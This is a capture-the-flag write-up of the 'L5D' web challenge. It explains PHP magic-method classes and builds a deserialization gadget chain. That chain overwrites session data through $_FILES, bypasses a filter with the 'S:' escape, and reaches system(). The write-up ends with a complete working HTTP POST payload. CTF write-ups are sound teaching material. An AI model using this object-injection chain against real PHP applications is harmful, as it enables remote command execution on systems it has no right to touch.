



## L5D

by sqrtrev



Let's check given code first.

There are 5 classes like below:

```php
class L5D_Upload {

    function __wakeup() {
        global $cmd;
        global $is_upload;
        $cmd = "whoami";
        $_SESSION['name'] = randstr(14);
        $is_upload = (count($_FILES) > 0);
    }

    function __destruct() {
        global $is_upload;
        global $status;
        global $l5d_file;
        $status = "upload_fail";
        if ($is_upload) {

            foreach ($_FILES as $key => $value)
                $GLOBALS[$key] = $value;
        
            if(is_uploaded_file($l5d_file['tmp_name'])) {
                
                $check = @getimagesize($l5d_file["tmp_name"]);
                
                if($check !== false) {

                    $target_dir = "/var/tmp/";
                    $target_file = $target_dir . randstr(10);

                    if (file_exists($target_file)) {
                        echo "File already exists..<br>";
                        finalize();
                        exit;
                    }

                    if ($l5d_file["size"] > 500000) {
                        echo "File is too large..<br>";
                        finalize();
                        exit;
                    }

                    if (move_uploaded_file($l5d_file["tmp_name"], $target_file)) {
                        echo "File upload OK!<br>";
                        $l5d_file = $target_file;
                        $status = "upload_ok";
                    } else {
                        echo "Upload failed :(<br>";
                        finalize();
                        exit;
                    }

                } else {
                    finalize();
                    exit;
                }
                
            } else {
                echo "Bad hacker!<br>";
                finalize();
                exit;
            }
        }
    }
}
```



L5D_Upload is for file uploading. And you need to focus on two parts.



```php
foreach ($_FILES as $key => $value)
    $GLOBALS[$key] = $value;
/ ** skip ** /
if (move_uploaded_file($l5d_file["tmp_name"], $target_file)) {
    echo "File upload OK!<br>";
    $l5d_file = $target_file;
    $status = "upload_ok";
}
```



This makes the contents of $_FILES as global variable. Assume that $key will be \_SESSION and $value will be $\_SESSION's contents. This will overwrite our session. Fortunately, we use $\_SESSION['name'] and $\_FILES has also have $\_FILES['name']. This mean, we can overwrite $\_SESSION['name']  with file upload. So, the payload of overwriting session will be like this:



```
------WebKitFormBoundarysCJbH2RWHhDJhW4p
Content-Disposition: form-data; name="_SESSION"; filename="wubalubadubdub"
Content-Type: application/octet-stream

aa
```



and the if we uploaded file successfully, there will be no `finalize()` function.

(Note: finalize() will destroy session.)



```php
class L5D_ResetCMD {

    protected $new_cmd = "echo 'I am new cmd!'";

    function __wakeup() {
        global $cmd;
        global $is_upload;
        global $status;
        $_SESSION['name'] = randstr(14);
        $is_upload = false;

        if(!isset($this->new_cmd)) {
            $status = "error";
            $error = "Empty variable error!";
            throw new Exception($error);   
        }

        if(!is_string($this->new_cmd)) {
            $status = "error";
            $error = 'Type error!';
            throw new Exception($error);
        }
    }

    function __destruct() {
        global $cmd;
        global $status;
        $status = "reset";
        if($_SESSION['name'] === 'wubalubadubdub') {
            $cmd = $this->new_cmd;
        }
    }

}
```



L5D_ResetCMD will update $cmd variable if our session is `wubalubadubdub`.

Note that there is $_SESSION['name'] = randstr(14); at `__wakeup()`. 



```php
class L5D_Login {

    function __wakeup() {
        $this->login();
    }

    function __destruct() {
        $this->logout();
    }

    function login() {
        $flag = file_get_contents("/flag");
        $p4ssw0rd = hash("sha256", $flag);
        if($_GET['p4ssw0rd'] === $p4ssw0rd)
            $_SESSION['name'] = "wubalubadubdub";
    }

    function logout() {
        global $status;
        unset($_SESSION['name']);
        $status = "finish";
    }

}
```



L5D_Login is just for checking flag. I will not use this class in my payload.



```php
class L5D_SayMyName {

    function __wakeup() {
        if(!isset($_SESSION['name'])) 
            $_SESSION['name'] = randstr(14);
        echo "Your name is ".$_SESSION['name']."<br>";
    }

    function __destruct() {
        echo "Your name is ".$_SESSION['name']."<br>";
    }

}
```



L5D_SayMyName is just print our $_SESSION['name'];



```php
class L5D_Command {

    function __wakeup() {
        global $cmd;
        global $is_upload;
        $_SESSION['name'] = randstr(14);
        $is_upload = false;
        $cmd = "whoami";
    }

    function __toString() {
        global $cmd;
        return "Here is your command: {$cmd} <br>";
    }

    function __destruct() {
        global $cmd;
        global $status;
        global $is_unser_finished;
        $status = "cmd";
        if($is_unser_finished === true) {
            echo "Your command [<span style='color:red'>{$cmd}</span>] result: ";
            echo "<span style='color:blue'>";
            @system($cmd);
            echo "</span>";
        }
    }

}
```



L5D_Command is execute $cmd via `system()`.



So, Idea is simple now.

Unserialize the L5D_Upload for update $_SESSION for L5D_ResetCMD, update $cmd and do L5D_Command.

The one thing we need to consider is order of unserialization because of `__wakeup` and `__destruct`'s variable control.

Also, we could bypass the waf using `S:`



final payload:

```
POST /?%3f=O:9:"Directory":5:{s:6:"handle";O:10:"L5D_Upload":0:{}s:4:"path";O:12:"L5D_ResetCMD":1:{S:10:"%00\2a%00new_cmd";s:2:"ls";}s:6:"handle";O:10:"L5D_Upload":0:{}s:1:"h";O:11:"L5D_Command":0:{}s:6:"handle";O:10:"L5D_Upload":0:{}} HTTP/1.1
Host: l5d.balsnctf.com:12345
Content-Length: 4360
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Whale/2.8.108.15 Safari/537.36
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaxaBJ35r377fSyzt
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=sqrtrev
Connection: close

------WebKitFormBoundaryaxaBJ35r377fSyzt
Content-Disposition: form-data; name="_SESSION"; filename="wubalubadubdub"
Content-Type: application/octet-stream

aaa
------WebKitFormBoundaryaxaBJ35r377fSyzt
Content-Disposition: form-data; name="l5d_file"; filename="Screenshot_2020-11-14_at_12.03.20_PM.png"
Content-Type: image/png

{SMALL IMAGE HERE}
------WebKitFormBoundaryaxaBJ35r377fSyzt--
```

